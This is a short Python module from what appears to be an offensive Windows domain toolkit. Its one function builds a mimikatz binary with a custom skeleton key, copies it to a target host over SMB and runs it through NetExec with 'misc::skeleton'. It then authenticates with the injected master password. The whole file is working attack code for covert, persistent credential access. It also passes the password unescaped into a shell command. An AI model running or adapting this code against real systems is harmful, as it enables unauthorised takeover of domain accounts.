import subprocess
from ..Modules.utils import run_command
from .miscellaneous import drop_mimikatz

def skeleton_mouse(skeleton_key: str, ip: str, user: str, password: str) -> None:
        run_command(["python3", "skeletonkey.py", skeleton_key, "x64/mimikatz.exe", "mimikatz.exe"])

        drop_mimikatz(user, password, ip)

        mimikatz_command = f'nxc smb {ip} -u {user} -p \'{password}\' -X "C:\\Users\\{user}\\Desktop\\mimikatz.exe \\"privilege::debug\\" \\"misc::skeleton\\" \\"exit\\""'
        subprocess.run(mimikatz_command, shell=True)

        run_command(["nxc", "smb", ip, "-u", user, "-p", skeleton_key, "-k"])